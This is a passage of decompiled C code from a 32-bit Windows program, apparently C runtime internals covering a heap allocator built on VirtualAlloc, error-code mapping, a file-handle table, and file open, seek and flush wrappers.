                    *v29 = a1;
                }
            }
            // 0x4046c3
            v28 = v13 + 8;
            v16 = v17 + 0x1000;
            while (v28 < v22) {
                // 0x4046a0
                v13 = v28;
                v17 = v16;
                v25 = *(int32_t *)v13;
                if (v25 >= a1) {
                    // 0x4046a9
                    v29 = (int32_t *)(v13 + 4);
                    if (*v29 > a1) {
                        // 0x4046ae
                        *v3 = a1;
                        *v4 = v25;
                        *v5 = v17;
                        v32 = function_40486f(v17, (int32_t)&g110, (int32_t)&g110);
                        if (v32 != 0) {
                            goto lab_0x404732_2;
                        }
                        // 0x4046bd
                        *v29 = a1;
                    }
                }
                // 0x4046c3
                v28 = v13 + 8;
                v16 = v17 + 0x1000;
            }
            // 0x4046dd
            v10 = *v20;
        }
        // 0x4046dd
        v11 = v10;
        v23 = v6 + 24;
        if (v23 < v11) {
            // 0x4046f0
            v14 = v23;
            v19 = *v7;
            v26 = (int32_t *)v14;
            v27 = *v26;
            if (v27 >= a1) {
                // 0x4046f6
                v31 = (int32_t *)(v14 + 4);
                if (*v31 > a1) {
                    // 0x4046fb
                    *v3 = a1;
                    *v4 = v27;
                    *v5 = v19;
                    v33 = function_40486f(v19, (int32_t)&g110, (int32_t)&g110);
                    v9 = v26;
                    v12 = v33;
                    v15 = v14;
                    if (v33 != 0) {
                        goto lab_0x404732_2;
                    }
                    // 0x40470c
                    *v31 = a1;
                }
            }
            // 0x40470f
            v30 = v14 + 8;
            v18 = v19 + 0x1000;
            while (v30 < v11) {
                // 0x4046f0
                v14 = v30;
                v19 = v18;
                v26 = (int32_t *)v14;
                v27 = *v26;
                if (v27 >= a1) {
                    // 0x4046f6
                    v31 = (int32_t *)(v14 + 4);
                    if (*v31 > a1) {
                        // 0x4046fb
                        *v3 = a1;
                        *v4 = v27;
                        *v5 = v19;
                        v33 = function_40486f(v19, (int32_t)&g110, (int32_t)&g110);
                        v9 = v26;
                        v12 = v33;
                        v15 = v14;
                        if (v33 != 0) {
                            goto lab_0x404732_2;
                        }
                        // 0x40470c
                        *v31 = a1;
                    }
                }
                // 0x40470f
                v30 = v14 + 8;
                v18 = v19 + 0x1000;
            }
        }
    }
    int32_t v34 = *(int32_t *)v6; // 0x404723
    while (v34 != (int32_t)g35) {
        // 0x404675
        v6 = v34;
        v7 = (int32_t *)(v6 + 16);
        v8 = *v7;
        if (v8 != -1) {
            // 0x404681
            v20 = (int32_t *)(v6 + 8);
            v21 = *v20;
            v22 = v6 + 0x2018;
            v10 = v21;
            if (v21 < v22) {
                // 0x4046a0
                v13 = v21;
                v17 = 0x1000 * (0x7fffe8 - v6 + v21) / 8 + v8;
                v24 = (int32_t *)v13;
                v25 = *v24;
                if (v25 >= a1) {
                    // 0x4046a9
                    v29 = (int32_t *)(v13 + 4);
                    if (*v29 > a1) {
                        // 0x4046ae
                        *v3 = a1;
                        *v4 = v25;
                        *v5 = v17;
                        v32 = function_40486f(v17, (int32_t)&g110, (int32_t)&g110);
                        v9 = v24;
                        v12 = v32;
                        v15 = v13;
                        if (v32 != 0) {
                            goto lab_0x404732_2;
                        }
                        // 0x4046bd
                        *v29 = a1;
                    }
                }
                // 0x4046c3
                v28 = v13 + 8;
                v16 = v17 + 0x1000;
                while (v28 < v22) {
                    // 0x4046a0
                    v13 = v28;
                    v17 = v16;
                    v24 = (int32_t *)v13;
                    v25 = *v24;
                    if (v25 >= a1) {
                        // 0x4046a9
                        v29 = (int32_t *)(v13 + 4);
                        if (*v29 > a1) {
                            // 0x4046ae
                            *v3 = a1;
                            *v4 = v25;
                            *v5 = v17;
                            v32 = function_40486f(v17, (int32_t)&g110, (int32_t)&g110);
                            v9 = v24;
                            v12 = v32;
                            v15 = v13;
                            if (v32 != 0) {
                                goto lab_0x404732_2;
                            }
                            // 0x4046bd
                            *v29 = a1;
                        }
                    }
                    // 0x4046c3
                    v28 = v13 + 8;
                    v16 = v17 + 0x1000;
                }
                // 0x4046dd
                v10 = *v20;
            }
            // 0x4046dd
            v11 = v10;
            v23 = v6 + 24;
            if (v23 < v11) {
                // 0x4046f0
                v14 = v23;
                v19 = *v7;
                v26 = (int32_t *)v14;
                v27 = *v26;
                if (v27 >= a1) {
                    // 0x4046f6
                    v31 = (int32_t *)(v14 + 4);
                    if (*v31 > a1) {
                        // 0x4046fb
                        *v3 = a1;
                        *v4 = v27;
                        *v5 = v19;
                        v33 = function_40486f(v19, (int32_t)&g110, (int32_t)&g110);
                        v9 = v26;
                        v12 = v33;
                        v15 = v14;
                        if (v33 != 0) {
                            goto lab_0x404732_2;
                        }
                        // 0x40470c
                        *v31 = a1;
                    }
                }
                // 0x40470f
                v30 = v14 + 8;
                v18 = v19 + 0x1000;
                while (v30 < v11) {
                    // 0x4046f0
                    v14 = v30;
                    v19 = v18;
                    v26 = (int32_t *)v14;
                    v27 = *v26;
                    if (v27 >= a1) {
                        // 0x4046f6
                        v31 = (int32_t *)(v14 + 4);
                        if (*v31 > a1) {
                            // 0x4046fb
                            *v3 = a1;
                            *v4 = v27;
                            *v5 = v19;
                            v33 = function_40486f(v19, (int32_t)&g110, (int32_t)&g110);
                            v9 = v26;
                            v12 = v33;
                            v15 = v14;
                            if (v33 != 0) {
                                goto lab_0x404732_2;
                            }
                            // 0x40470c
                            *v31 = a1;
                        }
                    }
                    // 0x40470f
                    v30 = v14 + 8;
                    v18 = v19 + 0x1000;
                }
            }
        }
        // 0x404723
        v34 = *(int32_t *)v6;
    }
    int32_t v35 = &g32;
    int32_t v36 = *(int32_t *)(v35 + 16); // 0x404749
    int32_t v37; // 0x404667
    int32_t v38; // 0x404667
    int32_t dwSize; // 0x404667
    int32_t * v39; // 0x404667
    int32_t v40; // 0x40474f
    int32_t * v41; // 0x40477a
    if (v36 != -1) {
        // 0x40474f
        v39 = (int32_t *)(v35 + 12);
        v40 = *v39;
        if (v40 != 0) {
            // 0x404761
            v41 = (int32_t *)v40;
            v38 = 0;
            v37 = v40;
            dwSize = 0;
            if (*v41 != -1) {
                goto lab_0x404790;
            } else {
                goto lab_0x40477f;
            }
        }
    }
    int32_t v42 = *(int32_t *)v35; // 0x404755
    while (v42 != (int32_t)&g32) {
        // 0x404749
        v35 = v42;
        v36 = *(int32_t *)(v35 + 16);
        if (v36 != -1) {
            // 0x40474f
            v39 = (int32_t *)(v35 + 12);
            v40 = *v39;
            if (v40 != 0) {
                // 0x404761
                v41 = (int32_t *)v40;
                v38 = 0;
                v37 = v40;
                dwSize = 0;
                if (*v41 != -1) {
                    goto lab_0x404790;
                } else {
                    goto lab_0x40477f;
                }
            }
        }
        // 0x404755
        v42 = *(int32_t *)v35;
    }
    int32_t v43 = function_40436f(); // 0x404836
    int32_t result = 0; // 0x40483d
    if (v43 != 0) {
        int32_t v44 = *(int32_t *)(v43 + 16); // 0x40483f
        int32_t v45 = v44 + 8; // 0x404842
        *(char *)v45 = (char)a1;
        *(int32_t *)&g35 = v43;
        *(int32_t *)v44 = v45 + a1;
        *(int32_t *)(v44 + 4) = 240 - a1;
        int32_t * v46 = (int32_t *)(v43 + 24); // 0x40485d
        *v46 = *v46 - (a1 & 255);
        result = v44 + 256;
    }
  lab_0x40486a:
    // 0x40486a
    return result;
  lab_0x404732_2:;
    int32_t * v47 = v9;
    *(int32_t *)&g35 = v6;
    *v47 = *v47 - a1;
    *v20 = v15;
    result = v12;
    return result;
  lab_0x404790:;
    int32_t v48 = 0x1000 * (0x7fffe8 - v35 + v40) / 8 + v36; // 0x404777
    *v3 = 4;
    int32_t lpAddress = 0x1000 * dwSize; // 0x404795
    *v4 = 0x1000;
    *v5 = lpAddress;
    *(int32_t *)(v2 - 16) = v48;
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, (int32_t)&g110, (int32_t)&g110); // 0x4047a2
    result = 0;
    int32_t v49; // 0x404667
    int32_t v50; // 0x404667
    int32_t v51; // 0x404667
    int32_t v52; // 0x404667
    if (v48 != (int32_t)memory) {
        goto lab_0x40486a;
    } else {
        // 0x4047b0
        *(int32_t *)(v2 - 20) = 0;
        *(int32_t *)(v2 - 24) = lpAddress;
        *(int32_t *)(v2 - 28) = v48;
        function_405a20((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        v51 = v40;
        if (dwSize < 1) {
            goto lab_0x4047f7;
        } else {
            // 0x4047c7
            v52 = dwSize;
            v49 = v48 + 4;
            v50 = v40;
            goto lab_0x4047cd;
        }
    }
  lab_0x40477f:
    // 0x40477f
    dwSize = 16;
    if (v38 > 15) {
        goto lab_0x404790;
    } else {
        int32_t v53 = v37 + 8; // 0x404785
        int32_t v54 = v38 + 1; // 0x404788
        v38 = v54;
        v37 = v53;
        dwSize = v54;
        if (*(int32_t *)v53 == -1) {
            goto lab_0x40477f;
        } else {
            goto lab_0x404790;
        }
    }
  lab_0x4047f7:
    // 0x4047f7
    *(int32_t *)&g35 = v35;
    uint32_t v55 = v35 + 0x2018; // 0x4047fd
    int32_t v56 = v51; // 0x404805
    if (v51 >= v55) {
        goto lab_0x404813;
    } else {
        goto lab_0x404807;
    }
  lab_0x404813:
    // 0x404813
    *v39 = 0;
    int32_t v57 = v48 + 8; // 0x40481d
    *(char *)v57 = (char)a1;
    *(int32_t *)(v35 + 8) = v40;
    *v41 = *v41 - a1;
    int32_t * v58 = (int32_t *)(v48 + 4); // 0x404825
    *v58 = *v58 - a1;
    *(int32_t *)v48 = v57 + a1;
    result = v48 + 256;
    goto lab_0x40486a;
  lab_0x404807:
    // 0x404807
    if (*(int32_t *)v56 == -1) {
        goto lab_0x404813;
    } else {
        int32_t v59 = v56 + 8; // 0x40480c
        v56 = v59;
        if (v59 >= v55) {
            goto lab_0x404813;
        } else {
            goto lab_0x404807;
        }
    }
  lab_0x4047cd:;
    int32_t v60 = v49;
    *(char *)(v60 + 244) = -1;
    *(int32_t *)(v60 - 4) = v60 + 4;
    *(int32_t *)v60 = 240;
    *(int32_t *)v50 = 240;
    *(int32_t *)(v50 + 4) = 241;
    int32_t v61 = v50 + 8; // 0x4047ef
    int32_t v62 = v52 - 1; // 0x4047f2
    v52 = v62;
    v49 = v60 + 0x1000;
    v50 = v61;
    v51 = v61;
    if (v62 != 0) {
        goto lab_0x4047cd;
    } else {
        goto lab_0x4047f7;
    }
}

// Address range: 0x40486f - 0x404993
int32_t function_40486f(int32_t a1, int32_t a2, uint32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x40487b
    uint32_t v2 = *v1; // 0x40487b
    int32_t * v3 = (int32_t *)a1; // 0x40487f
    uint32_t v4 = *v3; // 0x40487f
    uint32_t v5 = a1 + 248; // 0x404881
    int32_t v6; // 0x40486f
    if (v2 >= a3) {
        // 0x404893
        *(char *)v4 = (char)a3;
        if (v4 + a3 >= v5) {
            // 0x4048a3
            *v1 = 0;
            *v3 = a1 + 8;
            v6 = v4;
        } else {
            // 0x40489c
            *v3 = *v3 + a3;
            *v1 = *v1 - a3;
            v6 = v4;
        }
      lab_0x404982:
        // 0x40498e
        return -15 * a1 + 128 + 16 * v6;
    }
    int32_t v7 = v4 + v2; // 0x4048b4
    int32_t v8 = *(char *)v7 == 0 ? v4 : v7;
    int32_t v9; // bp-20, 0x40486f
    int32_t * v10 = (int32_t *)((int32_t)&v9 - 4);
    int32_t v11 = a2; // 0x4048c2
    if (v8 + a3 < v5) {
        char * v12 = (char *)v8;
        unsigned char v13 = *v12; // 0x4048c4
        int32_t v14; // 0x40486f
        int32_t v15; // 0x40486f
        int32_t v16; // 0x40486f
        uint32_t v17; // 0x40486f
        int32_t v18; // 0x40486f
        int32_t v19; // 0x40486f
        uint32_t v20; // 0x40492b
        int32_t v21; // 0x4048e7
        if (v13 != 0) {
            // 0x4048fa
            v18 = a2;
            v19 = v8 + (int32_t)v13;
        } else {
            // 0x4048ca
            *v10 = 1;
            v17 = 1;
            v14 = v8 + 1;
            v15 = v14;
            v16 = v17 + 1;
            while (*(char *)v14 == 0) {
                // 0x4048d0
                v17 = v16;
                v14 = v15 + 1;
                v15 = v14;
                v16 = v17 + 1;
            }
            if (v17 >= a3) {
                // 0x40492b
                v20 = v8 + a3;
                if (v20 >= v5) {
                    // 0x40493c
                    *v1 = 0;
                    *v3 = a1 + 8;
                    // 0x404945
                    *v12 = (char)a3;
                    v6 = v8;
                    return -15 * a1 + 128 + 16 * v6;
                } else {
                    // 0x404933
                    *v3 = v20;
                    *v1 = v17 - a3;
                    // 0x404945
                    *v12 = (char)a3;
                    v6 = v8;
                    return -15 * a1 + 128 + 16 * v6;
                }
            }
            if (v8 != v4) {
                // 0x4048e7
                v21 = a2 - v17;
                v18 = v21;
                v19 = v14;
                if (v21 < a3) {
                    // 0x40498e
                    return 0;
                }
            } else {
                // 0x4048e2
                *v1 = v17;
                v18 = a2;
                v19 = v14;
            }
        }
        int32_t v22 = v19;
        int32_t v23 = v18;
        v11 = v23;
        while (v22 + a3 < v5) {
            int32_t v24 = v22;
            int32_t v25 = v23;
            v12 = (char *)v24;
            v13 = *v12;
            if (v13 != 0) {
                // 0x4048fa
                v18 = v25;
                v19 = v24 + (int32_t)v13;
            } else {
                // 0x4048ca
                *v10 = 1;
                v17 = 1;
                v14 = v24 + 1;
                v15 = v14;
                v16 = v17 + 1;
                while (*(char *)v14 == 0) {
                    // 0x4048d0
                    v17 = v16;
                    v14 = v15 + 1;
                    v15 = v14;
                    v16 = v17 + 1;
                }
                if (v17 >= a3) {
                    // 0x40492b
                    v20 = v24 + a3;
                    if (v20 >= v5) {
                        // 0x40493c
                        *v1 = 0;
                        *v3 = a1 + 8;
                        // 0x404945
                        *v12 = (char)a3;
                        v6 = v24;
                        return -15 * a1 + 128 + 16 * v6;
                    } else {
                        // 0x404933
                        *v3 = v20;
                        *v1 = v17 - a3;
                        // 0x404945
                        *v12 = (char)a3;
                        v6 = v24;
                        return -15 * a1 + 128 + 16 * v6;
                    }
                }
                if (v24 != v4) {
                    // 0x4048e7
                    v21 = v25 - v17;
                    v18 = v21;
                    v19 = v14;
                    if (v21 < a3) {
                        // 0x40498e
                        return 0;
                    }
                } else {
                    // 0x4048e2
                    *v1 = v17;
                    v18 = v25;
                    v19 = v14;
                }
            }
            // 0x4048ff
            v22 = v19;
            v23 = v18;
            v11 = v23;
        }
    }
    int32_t v26 = v11; // 0x404907
    int32_t v27 = a1 + 8; // 0x404907
    while (v27 < v4) {
        int32_t v28 = v27;
        uint32_t v29 = v28 + a3; // 0x40490e
        if (v29 >= v5) {
            return 0;
        }
        char * v30 = (char *)v28;
        unsigned char v31 = *v30; // 0x404916
        while (v31 != 0) {
            int32_t v32 = v28 + (int32_t)v31; // 0x40495f
            if (v32 >= v4) {
                return 0;
            }
            v28 = v32;
            v29 = v28 + a3;
            if (v29 >= v5) {
                return 0;
            }
            // 0x404916
            v30 = (char *)v28;
            v31 = *v30;
        }
        // 0x40491c
        *v10 = 1;
        uint32_t v33 = 1;
        v27 = v28 + 1;
        int32_t v34 = v33 + 1; // 0x404925
        int32_t v35 = v27; // 0x404925
        while (*(char *)v27 == 0) {
            // 0x404922
            v33 = v34;
            v27 = v35 + 1;
            v34 = v33 + 1;
            v35 = v27;
        }
        if (v33 >= a3) {
            // 0x40497d
            *v3 = v29;
            *v1 = v33 - a3;
            *v30 = (char)a3;
            v6 = v28;
            return -15 * a1 + 128 + 16 * v6;
        }
        // 0x404950
        v26 -= v33;
        if (v26 < a3) {
            // break -> 0x40498e
            break;
        }
    }
  lab_0x40498e_2:
    // 0x40498e
    return 0;
}

// Address range: 0x404993 - 0x4049fa
int32_t function_404993(int32_t a1) {
    // 0x404993
    g50 = a1;
    int32_t result = &g37; // 0x40499f
    int32_t v1 = 0;
    while (*(int32_t *)result != a1) {
        // 0x4049a8
        result += 8;
        if (result >= (int32_t)&g39) {
            if (a1 < 37) {
                // 0x4049bd
                g49 = 13;
                return result;
            }
            // 0x4049d5
            g49 = a1 < 203 ? 8 : 22;
            return result;
        }
        v1++;
    }
    int32_t result2 = *(int32_t *)(8 * v1 + (int32_t)&g38); // 0x4049c8
    g49 = result2;
    return result2;
}

// Address range: 0x4049fa - 0x404a8f
int32_t function_4049fa(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, char a10, int32_t a11) {
    int32_t v1 = &g96; // 0x404a04
    int32_t v2 = -1; // 0x404a04
    int32_t v3 = 0; // 0x404a04
    int32_t v4 = 0; // 0x404a04
    int32_t result2; // 0x4049fa
    int32_t v5; // 0x4049fa
    while (true) {
        // 0x404a09
        v5 = v4;
        result2 = v2;
        int32_t * v6 = (int32_t *)v1; // 0x404a09
        uint32_t v7 = *v6; // 0x404a09
        if (v7 == 0) {
            // break -> 0x404a46
            break;
        }
        int32_t v8 = v3;
        uint32_t v9 = v7 + 256; // 0x404a0f
        int32_t v10 = v7; // 0x404a17
        int32_t v11 = result2; // 0x404a17
        int32_t result; // 0x4049fa
        if (v7 < 0xffffff00) {
            int32_t v12 = v10;
            while ((*(char *)(v12 + 4) & 1) != 0) {
                int32_t v13 = v12 + 8; // 0x404a1f
                v10 = v13;
                v11 = result2;
                if (v13 >= v9) {
                    goto lab_0x404a35;
                }
                v12 = v10;
            }
            // 0x404a24
            *(int32_t *)v12 = -1;
            int32_t v14 = (v12 - *v6) / 8 + v8; // 0x404a2c
            v11 = v14;
            result = v14;
            if (v14 != -1) {
                // 0x404a89
                return result;
            }
        }
      lab_0x404a35:
        // 0x404a35
        v2 = v11;
        v1 += 4;
        v3 = v8 + 32;
        v4 = v5 + 1;
        result = v2;
        if (v1 >= (int32_t)&g98) {
            // 0x404a89
            return result;
        }
    }
    int32_t * v15 = _malloc(256); // 0x404a4c
    if (v15 == NULL) {
        // 0x404a89
        return result2;
    }
    int32_t v16 = (int32_t)v15; // 0x404a4c
    int32_t * v17 = (int32_t *)(4 * v5 + (int32_t)&g96); // 0x404a6a
    *v17 = v16;
    if (v15 >= (int32_t *)-256) {
        // 0x404a89
        return 32 * v5;
    }
    for (int32_t i = v16; i < *v17 + 256; i += 8) {
        // 0x404a70
        *(char *)(i + 4) = 0;
        *(int32_t *)i = -1;
        *(char *)(i + 5) = 10;
    }
    // 0x404a89
    return 32 * v5;
}

// Address range: 0x404a8f - 0x404b06
int32_t function_404a8f(uint32_t a1, int32_t hHandle) {
    // 0x404a8f
    if ((int32_t)g98 <= a1) {
        // 0x404aef
        g50 = 0;
        g49 = 9;
        // 0x404b03
        return -1;
    }
    int32_t v1 = 8 * a1 & 248; // 0x404aae
    int32_t * v2 = (int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x404ab1
    int32_t * v3 = (int32_t *)(*v2 + v1);
    if (*v3 != -1) {
        // 0x404aef
        g50 = 0;
        g49 = 9;
        // 0x404b03
        return -1;
    }
    // 0x404ab9
    if (g14 != 1) {
        // 0x404ae5
        *v3 = hHandle;
        // 0x404b03
        return 0;
    }
    int32_t nStdHandle = -10; // 0x404aca
    if (a1 != 0) {
        int32_t v4 = a1 - 1; // 0x404acc
        nStdHandle = -11;
        if (v4 != 0) {
            // 0x404acf
            nStdHandle = -12;
            if (v4 != 1) {
                // 0x404ae5
                *v3 = hHandle;
                // 0x404b03
                return 0;
            }
        }
    }
    // 0x404adf
    SetStdHandle(nStdHandle, (int32_t *)hHandle);
    // 0x404ae5
    *(int32_t *)(*v2 + v1) = hHandle;
    // 0x404b03
    return 0;
}

// Address range: 0x404b06 - 0x404b80
int32_t function_404b06(uint32_t a1) {
    // 0x404b06
    if ((int32_t)g98 <= a1) {
        // 0x404b69
        g50 = 0;
        g49 = 9;
        // 0x404b7d
        return -1;
    }
    int32_t v1 = 8 * a1 & 248; // 0x404b25
    int32_t * v2 = (int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x404b28
    int32_t v3 = *v2 + v1;
    if ((*(char *)(v3 + 4) & 1) == 0) {
        // 0x404b69
        g50 = 0;
        g49 = 9;
        // 0x404b7d
        return -1;
    }
    int32_t * v4 = (int32_t *)v3;
    if (*v4 == -1) {
        // 0x404b69
        g50 = 0;
        g49 = 9;
        // 0x404b7d
        return -1;
    }
    // 0x404b37
    if (g14 != 1) {
        // 0x404b5f
        *v4 = -1;
        // 0x404b7d
        return 0;
    }
    int32_t nStdHandle = -10; // 0x404b44
    if (a1 != 0) {
        int32_t v5 = a1 - 1; // 0x404b46
        nStdHandle = -11;
        if (v5 != 0) {
            // 0x404b49
            nStdHandle = -12;
            if (v5 != 1) {
                // 0x404b5f
                *v4 = -1;
                // 0x404b7d
                return 0;
            }
        }
    }
    // 0x404b59
    SetStdHandle(nStdHandle, NULL);
    // 0x404b5f
    *(int32_t *)(*v2 + v1) = -1;
    // 0x404b7d
    return 0;
}

// Address range: 0x404b80 - 0x404bbd
int32_t function_404b80(uint32_t a1) {
    // 0x404b80
    if ((int32_t)g98 <= a1) {
        // 0x404ba8
        g50 = 0;
        g49 = 9;
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x404b94
    int32_t v2 = v1 + (8 * a1 & 248);
    if ((*(char *)(v2 + 4) & 1) != 0) {
        // 0x404ba5
        return *(int32_t *)v2;
    }
    // 0x404ba8
    g50 = 0;
    g49 = 9;
    return -1;
}

// Address range: 0x404bbd - 0x404c14
int32_t function_404bbd(uint32_t a1) {
    // 0x404bbd
    if ((int32_t)g98 <= a1) {
        // 0x404c06
        g49 = 9;
        // 0x404c13
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x404bd3
    if ((*(char *)(v1 + (8 * a1 & 248 | 4)) & 1) == 0) {
        // 0x404c06
        g49 = 9;
        // 0x404c13
        return -1;
    }
    // 0x404be1
    if (FlushFileBuffers((int32_t *)function_404b80(a1))) {
        // 0x404c13
        return 0;
    }
    int32_t errorCode = GetLastError(); // 0x404bf3
    if (errorCode == 0) {
        // 0x404c13
        return 0;
    }
    // 0x404c01
    g50 = errorCode;
    // 0x404c06
    g49 = 9;
    // 0x404c13
    return -1;
}

// Address range: 0x404c14 - 0x404cae
int32_t function_404c14(uint32_t a1, int32_t lDistanceToMove, int32_t dwMoveMethod) {
    // 0x404c14
    if ((int32_t)g98 <= a1) {
        // 0x404c96
        g50 = 0;
        g49 = 9;
        // 0x404caa
        return -1;
    }
    int32_t * v1 = (int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x404c37
    int32_t v2 = 8 * a1 & 248 | 4;
    if ((*(char *)(*v1 + v2) & 1) == 0) {
        // 0x404c96
        g50 = 0;
        g49 = 9;
        // 0x404caa
        return -1;
    }
    int32_t hFile = function_404b80(a1); // 0x404c41
    if (hFile == -1) {
        // 0x404c4c
        g49 = 9;
        // 0x404caa
        return -1;
    }
    int32_t result = SetFilePointer((int32_t *)hFile, lDistanceToMove, NULL, dwMoveMethod); // 0x404c63
    if (result == -1) {
        int32_t errorCode = GetLastError(); // 0x404c70
        if (errorCode != 0) {
            // 0x404c7e
            function_404993(errorCode);
            // 0x404caa
            return -1;
        }
    }
    char * v3 = (char *)(*v1 + v2); // 0x404c89
    *v3 = *v3 & -3;
    // 0x404caa
    return result;
}

// Address range: 0x404cae - 0x404cf2
int32_t function_404cae(int32_t a1) {
    // 0x404cae
    g48++;
    int32_t * v1 = _malloc(0x1000); // 0x404cb9
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x404cc5
    *v2 = (int32_t)v1;
    int32_t * v3 = (int32_t *)(a1 + 12);
    int32_t v4 = *v3;
    if (v1 == NULL) {
        // 0x404cd7
        *v3 = v4 | 4;
        *v2 = a1 + 20;
        *(int32_t *)(a1 + 24) = 2;
    } else {
        // 0x404cca
        *v3 = v4 | 8;
        *(int32_t *)(a1 + 24) = 0x1000;
    }
    int32_t result = *v2; // 0x404ce8
    *(int32_t *)(a1 + 4) = 0;
    *(int32_t *)a1 = result;
    return result;
}

// Address range: 0x404cf2 - 0x404fab
int32_t function_404cf2(int32_t lpFileName, uint32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = 0x1000000 * a4 / 0x1000000;
    int32_t lpSecurityAttributes = 12; // bp-32, 0x404d03
    char v2 = (char)(a2 / 8) & 16;
    char v3 = v2; // 0x404d2a
    if ((int16_t)a2 > -1) {
        // 0x404d2c
        v3 = (a2 & 0x4000) == 0 == g77 == 0x8000 ? v2 : v2 | -128;
    }
    char v4 = v3;
    int32_t dwDesiredAccess = -0x40000000; // 0x404cf2
    switch (a2 & 3) {
        case 0: {
            // 0x404d75
            dwDesiredAccess = -0x80000000;
            goto lab_0x404d7c;
        }
        case 1: {
            // 0x404d6c
            dwDesiredAccess = 0x40000000;
            goto lab_0x404d7c;
        }
        case 2: {
            goto lab_0x404d7c;
        }
        default: {
            goto lab_0x404d4e;
        }
    }
  lab_0x404d7c:;
    int32_t dwShareMode = 2; // 0x404cf2
    switch (a3) {
        case 16: {
            // 0x404daa
            dwShareMode = 0;
            goto lab_0x404dad;
        }
        case 32: {
            // 0x404da1
            dwShareMode = 1;
            goto lab_0x404dad;
        }
        case 48: {
            goto lab_0x404dad;
        }
        default: {
            // 0x404d8e
            dwShareMode = 3;
            if (a3 != 64) {
                // 0x404d4e
                g49 = 22;
                g50 = 0;
                // 0x404fa6
                return -1;
            }
            goto lab_0x404dad;
        }
    }
  lab_0x404dad:;
    uint32_t v5 = a2 & 1792; // 0x404db7
    int32_t dwCreationDisposition; // 0x404cf2
    if (v5 > 1024) {
        // 0x404df7
        dwCreationDisposition = 1;
        switch (v5) {
            case 1280: {
                goto lab_0x404e20;
            }
            case 1536: {
                // 0x404e10
                dwCreationDisposition = 5;
                goto lab_0x404e20;
            }
            case 1792: {
                goto lab_0x404e20;
            }
            default: {
                goto lab_0x404d4e;
            }
        }
    } else {
        // 0x404dc2
        dwCreationDisposition = 4;
        switch (v5 / 256) {
            case 4: {
                // 0x404df2
                dwCreationDisposition = 3;
                goto lab_0x404e20;
            }
            case 0: {
                // 0x404df2
                dwCreationDisposition = 3;
                goto lab_0x404e20;
            }
            case 1: {
                goto lab_0x404e20;
            }
            case 2: {
                // 0x404e10
                dwCreationDisposition = 5;
                goto lab_0x404e20;
            }
            default: {
                // 0x404dd4
                dwCreationDisposition = 2;
                if (v5 != 768) {
                  lab_0x404d4e:
                    // 0x404d4e
                    g49 = 22;
                    g50 = 0;
                    // 0x404fa6
                    return -1;
                }
                goto lab_0x404e20;
            }
        }
    }
  lab_0x404e20:;
    int32_t v6 = 128; // 0x404e2a
    if ((a2 & 256) != 0) {
        // 0x404e2c
        v6 = (char)((g51 ^ 128) & a5) <= -1 ? 128 : 1;
    }
    int32_t v7 = a2 / 16 & 256 | 0x100000 * a2 & 0x4000000 | v6;
    int32_t dwFlagsAndAttributes; // 0x404cf2
    if ((a2 & 32) == 0) {
        // 0x404e60
        dwFlagsAndAttributes = v7 | 0x1000000 * a2 & 0x10000000;
    } else {
        // 0x404e58
        dwFlagsAndAttributes = v7 | 0x8000000;
    }
    // 0x404e6a
    int32_t v8; // 0x404cf2
    int32_t v9; // 0x404cf2
    int32_t v10; // 0x404cf2
    int32_t v11; // 0x404cf2
    int32_t result = function_4049fa(v8, v9, v11, 12, 0, (int32_t)((char)a2 > -1), dwShareMode, dwDesiredAccess, dwCreationDisposition, v4, v10); // 0x404e6a
    if (result == -1) {
        // 0x404e78
        g50 = 0;
        g49 = 24;
        // 0x404fa6
        return -1;
    }
    int32_t v12 = lpFileName; // bp-72, 0x404e9b
    int32_t * fileHandle = CreateFileA((char *)lpFileName, dwDesiredAccess, dwShareMode, (struct _SECURITY_ATTRIBUTES *)&lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, NULL); // 0x404e9e
    int32_t * v13 = &v12; // 0x404ea8
    if (fileHandle != (int32_t *)-1) {
        int32_t v14 = (int32_t)fileHandle; // 0x404e9e
        int32_t v15 = GetFileType(fileHandle); // 0x404eab
        int32_t v16; // bp-80, 0x404cf2
        if (v15 != 0) {
            char v17; // 0x404cf2
            if (v15 != 2) {
                // 0x404edb
                v17 = v15 != 3 ? v4 : v4 | 8;
            } else {
                // 0x404ed5
                v17 = v4 | 64;
            }
            // 0x404ee4
            v16 = v14;
            function_404a8f(result, v14);
            char v18 = v17 | 1; // 0x404ef4
            int32_t * v19 = (int32_t *)(4 * result / 32 + (int32_t)&g96); // 0x404f09
            int32_t v20 = 8 * result & 248 | 4;
            *(char *)(*v19 + v20) = v18;
            if ((a2 & 2) != 0 && v18 <= -1 && (v17 & 72) == 0) {
                // 0x404f1f
                v16 = 2;
                int32_t v21 = function_404c14(result, -1, 2); // 0x404f24
                if (v21 != -1) {
                    // 0x404f42
                    v1 = 0;
                    v16 = 1;
                    if (function_405efb(result, (char *)&v1, 1) == 0) {
                        // 0x404f59
                        if ((char)v1 == 26) {
                            // 0x404f5f
                            v16 = v21;
                            if (function_405db5(result, v21) == -1) {
                                // 0x404f81
                                v16 = result;
                                function_402002(result);
                                // 0x404fa6
                                return -1;
                            }
                        }
                    }
                    // 0x404f6f
                    v16 = 0;
                    if (function_404c14(result, 0, 0) == -1) {
                        // 0x404f81
                        v16 = result;
                        function_402002(result);
                        // 0x404fa6
                        return -1;
                    }
                } else {
                    // 0x404f34
                    if (g50 != 131) {
                        // 0x404f81
                        v16 = result;
                        function_402002(result);
                        // 0x404fa6
                        return -1;
                    }
                }
            }
            // 0x404f8d
            if ((a2 & 8) != 0 && (v17 & 72) == 0) {
                char * v22 = (char *)(*v19 + v20); // 0x404f9b
                *v22 = *v22 | 32;
            }
            // 0x404fa6
            return result;
        }
        // 0x404eb5
        v16 = v14;
        CloseHandle(fileHandle);
        v13 = &v16;
    }
    // 0x404ebc
    *(int32_t *)((int32_t)v13 - 4) = GetLastError();
